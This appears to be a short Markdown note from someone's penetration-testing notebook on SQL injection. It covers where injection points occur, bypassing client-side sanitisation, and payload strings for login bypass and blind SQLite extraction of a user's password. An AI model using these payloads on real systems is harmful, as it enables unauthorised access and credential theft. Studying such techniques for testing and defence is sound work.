### Conditions
1.) Submitted query must not be sanitized, or sanitization must be circumvented.

### Where To Look
#### Forms 
![Forms](../../media/sqli_1.png)
Often, form data is submitted 

#### URL Parameters 
![URL Parameters](../../media/sqli_2.png)
Sometimes the input can be directly manipulated from the URL

#### POST Injection  
If client-side sanitization takes place, can circumvent it by sending a POST request directly to the server-side API.

- [[curl|Curl]]
- Can also accomplish through the devtools in the browser


### What it looks like
#### Authentication Forms
In the username or password field adding one of the following inputs (dependent on SQL DB used on the backend):

`admin' OR 1=1-- -`
`admin' OR '1'='1'-- -`
`admin' OR 1=1;#`

#### Blind Injection
Boolean queries to extract info.
Can use the following tools:
- [[../../tools/sqlmap.md|SQLmap]]

Test for length of password (SQLite)
`admin' AND length((SELECT password from users where username='admin'))==37-- -`

Test for character in password (SQLite)
- `CAST(X'54' as Text')`: The way to represent a capital T in SQLite (X is hex; 54 is ASCII for 'T')
`admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)-- -`
